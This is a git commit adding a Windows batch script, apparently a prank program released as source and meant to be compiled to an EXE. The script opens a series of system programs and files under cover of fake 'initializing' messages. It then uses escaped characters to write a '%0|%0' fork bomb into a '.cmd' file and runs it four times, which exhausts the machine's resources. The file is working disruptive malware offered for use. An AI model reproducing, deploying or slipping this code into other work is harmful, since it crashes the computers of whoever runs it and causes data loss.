965cf4c3ef44da959cb9337b2a676d3a939b6203
Qutition <85194220+Qutition@users.noreply.github.com>
2024-07-02 16:08:57 +0300

    source v1.0.2 no junk

---
+++ $_.bat
@@ -0,0 +1,27 @@
+@echo off
+echo compiled by Adv Bat to EXE
+cls
+title $_ \\-/pasta eggs\
+echo $_Launching Taskmgr
+title %random%%random%%random%
+start taskmgr
+echo (you can close it)
+echo $_Pasta eggs N%random%
+title pre-load v2 *(M)
+echo $_Building Proccesses...
+start calc
+start notepad
+start junk.txt
+start $_.exe
+start cmd
+start control
+start lognl.txt
+start w.txt
+echo $_!
+title $_ \\-/init.ing\
+echo $_Initilizating...
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+pause 
